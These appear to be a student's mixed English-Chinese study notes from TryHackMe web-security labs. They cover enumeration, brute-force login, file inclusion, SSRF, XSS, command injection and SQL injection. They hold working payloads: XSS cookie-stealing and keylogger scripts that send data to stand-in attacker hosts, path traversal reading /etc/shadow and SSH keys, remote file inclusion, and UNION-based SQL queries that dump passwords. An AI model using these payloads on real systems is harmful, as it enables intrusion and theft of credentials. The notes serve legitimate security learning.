## Walking An Application :
	--> CSS : premium -- display: block --> change to display : none 
	--> F12 -- Google Chrome Source =Firefox Debugger -- Pretty Print {} 
		-->  breakpoints : 強制瀏覽器停止處理 JavaScript 並暫停目前執行的點 --> bule
## Content Discovery :
###  Manually :
		--> robots.txt
		--> favicon : 
			--> https://static-labs.tryhackme.cloud/sites/favicon/
			--> curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
			--> https://wiki.owasp.org/index.php/OWASP_favicon_database
		--> sitemap.xml -- 網站地圖
		--> HTTP Headers : curl http://10.10.52.124 -v
		--> Framework Stack
###  OSINT :
		--> Google Hacking / Dorking
			--> filter : site:
			--> https://en.wikipedia.org/wiki/Google_hacking

		--> Wappalyzer : https://www.wappalyzer.com/
			--> 使用的技術，例如框架、內容管理系統 ( CMS )、支付處理器
		--> Wayback Machine  : 
			--> 
		--> GitHub : version control system
		--> S3 Buckets :  Amazon AWS 提供的儲存服務 
			--> http(s):// {name}。s3.amazonaws.com  
### Automated Discovery :
		--> wordlists : 2024_5_CTF/wordlist/big.txt
		--> gobuster dir --url http://10.10.52.124/ -w 2024_5_CTF/wordlist/big.txt | /common.txt
## Subdomain Enumeration :
### OSINT 
		--> SSL/TLS Certificate
			--> https://crt.sh
			--> https://ui.ctsearch.entrust.com/ui/ctsearchui
		--> Search Engines (google)
			-->  -site:www.tryhackme.com  site:*.tryhackme.com
		--> Sublist3r : 
			--> ./sublist3r.py -d acmeitsupport.thm
### DNS Bruteforce :
		--> dnsrecon -t brt -d acmeitsupport.thm
###  Virtual Hosts :
		--> wordlist : https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
		--> ffuf -w namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.81.88 -fs {size}
		--> -w 使用的單字清單。 -H 新增/編輯標頭
## Authentication Bypass :
	--> Username Enumeration :
		--> ffuf -w 2024_5_CTF/wordlist/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.7.203/customers/signup -mr "username already exists"
	--> Brute Force : 
		--> ffuf -w valid_usernames.txt:W1,10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.7.203/customers/login -fc 200
	--> Logic Flaw : (===) 
		--> curl 'http://10.10.7.203/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
		--> curl 'http://10.10.7.203/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
		--> create account to steal a lint of 身分登入
	--> Cookie Tampering : 
		--> hashing (md5 /sha-256 /sha-512 /sha1 ) --> https://crackstation.net/

## Insecure Direct Object Reference(IDOR) : 
	--> change URL -- number
	--> network --> refresh --> right click : edit anf resend
## File Inclusion : 
	directory traversal :  PhP--file_get_contents
		--> dot-dot-slash attack (../)
			--> url.php?file=../../../../etc/passwd
		
		--> window : (c:\)
			-->.php?file=../../../../boot.ini
			-->.php?file=../../../../windows/win.ini
		--> common OS files :
			--> /etc/issue : 包含在登入提示之前列印的訊息或系統標識
			--> /etc/profile --控制系統範圍的預設變量，
				例如 匯出變數、檔案建立遮罩 (umask)、終端類型、指示新郵件何時到達的郵件訊息
			--> /proc/version --Linux核心的版本
			--> /etc/passwd --有權存取系統的註冊用戶
			--> /etc/shadow --係統使用者密碼的信息
			--> /root/.bash_history --包含root使用者的歷史命令
			--> /var/log/dmessage --包含全域系統訊息，包括系統啟動期間記錄的訊息
			--> /var/mail/root --root使用者的所有電子郵件
			--> /root/.ssh/id_rsa --  root 或任何已知有效使用者的SSH私鑰
			--> /var/log/apache2/access.log  -- Apache  Web 伺服器的存取請求
			--> C:\boot.ini -- BIOS
		
### Local File Inclusion (LFI) :
		--> 函數 :  include、require、include_once和require_once
			--> include 函數允許我們將任何呼叫的檔案包含到目前頁面中
			<?PHP 
				include("languages/". $_GET['lang']); 
			?>
			--> http://webapp.thm/index.php?lang=../../../../etc/passwd
		-->  NULL BYTE (%00) :	繞過指定要傳遞給包含函數的文件類型
			--> URL 編碼  , put %00 to URL 
			--> http://10.10.205.185/lab3.php?file=../../../../etc/passwd%00
			--> /. : 點引用目前目錄。
		--> 過濾關鍵字--繞過過濾器
			--> replaces the ../ with the empty string
				--> ....//....//....//....//....//etc/passwd
			
### Remote File Inclusion (RFI):
		--> allow_url_fopen : on 
		--> allow_url_fopen on 和 allow_url_include
		--> remote command execution (RCE)
			--> Sensitive Information Disclosure
			--> Cross-site Scripting (XSS)
			--> Denial of Service (DoS)
			
			-->inject an external URL into include 
				--> file : <?PHP echo "Hello THM"; ?>
				--> http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
		--> python3 -m http.server 
		--> nano host.txt 
			<?php
				print exec('hostname');
			?>
		--> ifconfig --> inet ip : 10.11.92.230
		-->?file=http://ip:8000/xx.txt
		-->?file=http://10.11.92.230:8000/host.txt

## Server-Side Request Forgery (SSRF)
	--> 允許惡意使用者導致網路伺服器向攻擊者選擇的資源發出額外的或經過編輯的 HTTP 請求
	--> regular : 資料返回到攻擊者的螢幕
	--> Blind : 但不會將任何資訊傳回攻擊者的螢幕
		--> 外部 HTTP 日誌記錄工具來監視請求 -- requestbin.com
		-->  Burp Suite 的 Collaborator 用戶端
	--> &x=結尾的有效負載，它用於防止剩餘路徑連接到攻擊者 URL 的末尾
		-->stock?server=api&id=123
		-->http://api.url/api/user?x=/url/api/stock/item?123
	find: 
		--> 當網址列中的參數使用完整 URL 時： 
			--> server=http://server.website.thm/store
		--> 部分 URL，例如主機名稱
			--> server=api
		--> 或者也許只是 URL 的路徑 
			--> dst=/form/contact
		--> <input -- value="path"> --? change path 

## Intro to Cross-site Scripting :  JavaScript 
	--> base on 訊息內容不會被檢查是否有任何惡意程式碼
	--> Payloads 
		--> intention 
			--> Test : <script>alert('XSS');</script>
			--> Session Stealing : 
				<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
			--> Key Logger : 網頁上輸入的任何內容都將被轉發到駭客控制下的網站
				<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
			--> Business Logic : 更改使用者電子郵件地址的 JavaScript 函數
				<script>user.changeEmail('attacker@hacker.thm');</script>
		--> modification
###  Reflected XSS
		-->error --> inject JS script 
			 --> error=<script src="https://../xx.js"></script>
		--> using link 
### Stored XSS
		--> 允許使用者發表評論的部落格網站 
		--> save to database 
###  DOM Based XSS
		-->  直接在瀏覽器中執行
		--> 「window.location.x」 --> window.location.hash
		--> 不安全的 JavaScript 方法 : eval()
###  Blind XSS	
		--> XSS Hunter Express : https://github.com/mandatoryprogrammer/xsshunter-express
		--> Netcat : nc -nlvp 9001
			--> -l 監聽 | -p 連接埠號碼 | -n 避免透過DNS解析主機名 | -v 詳細模式
		--> </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
			--> fetch() 命令發出HTTP請求 | btoa() 指令 base64編碼
			--> echho '' | base64 --decode

	--> 轉義輸入標籤 :
		--> end tab :  "><script>alert('THM');</script>
		--> end textarea tab : </textarea><script>alert('THM');</script>
		--> inclue img tab : ';alert('THM');//
			'指定名稱的字 | ;表示當前命令的結束 | //最後的 使後面的任何內容成為註釋而不是可執行代碼
		--> filter script : <sscriptcript>alert('THM');</sscriptcript>
		--> filter < > : using onload event  
			--> /images/cat.jpg" onload="alert('THM');
		--> mix : jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
		
## Command Injection == RCE  : 
	--> curl : test Command Injection
		--> curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
	--> PHP 、Python 和 NodeJS 
	--> find 輸入欄位中輸入的數據
	--> shell : ;,&和&&
	
	--> Blind command injection : 
		--> 沒有直接輸出的情況
		--> ping和sleep命令
		--> 重定向運算子（例如>)
		--> cat file 
	--> Verbose command injection : 
		--> 獲得直接回饋 --> whoami
	
### Payload : 
		--> Linux : whoami | ls | ping | sleep | nc
			--> 
		--> Windows : whoami | dir | ping | timout 
			--> “ & ”shell 運算子
		--> https://github.com/payloadbox/command-injection-payload-list
	Input sanitisation :
		--> filter_input ("numbe")
			--> 繞過過濾器 : 十六進制值 
				--> $payload = "\x2f\x00\x90\x90"

## SQL Injection: 
	--> Relationa : MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite
###  sql : 
		--> select * from users LIMIT 1;
		--> UNION :組合兩個或多個 SELECT 語句的結果
			--> SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
		--> insert into users (username,password) values ('bob','password123');
		--> update users SET username='root',password='pass123' where username='admin';
		--> delete from users where username='martin';
###  sqli : 
		--> 註解 ;--
		--> In-Band SQL Injection
		--> Error-Based SQL Injection
		--> Union-Based SQL Injection
			--> 新增另一列 ,2,3,...
	--> 字元 : 單撇號 (') 或引號 (")
		--> 收到此錯誤訊息這一事實證實了SQL注入漏洞的存在
		
###  In-Band SQL Injection : 
		--> method :  database() 
			--> group_concat() 從多個傳回的行中取得指定的列 
			--> group_concat(table_name)  | information_schema.tables  |table_schema
			--> group_concat(column_name) | information_schema.columns | table_name
		 https://website.thm/article?id=1 UNION SELECT 1
		--> 1 UNION SELECT 1
		--> 1 UNION SELECT 1,2
		--> 1 UNION SELECT 1,2,3 --> no error now
		--> 0 UNION SELECT 1,2,3 -- database
		--> 0 UNION SELECT 1,2,database()
		--> 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
		--> 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
		--> 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

### Blind SQLi
		--> Authentication Bypass -- login 
			--> ' OR 1=1;-- 
		--> Boolean Based: (true/false)
			--> Keep username : ?username=admin123' UNION SELECT 1,2,3;-- 
			--> database() : where database() like '%';--
			==> like 運算子中，我們只有% -- >匹配任何內容
				--> 循環遍歷所有字母、數字和字元 | like 'a%';--
			--> admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
		--> Time-Based:
			-->  SLEEP(x)
			--> admin123' UNION SELECT SLEEP(5);--
			--> admin123' UNION SELECT SLEEP(5),2 where database() like '%';--
			--> admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin' and password like '4961';--	
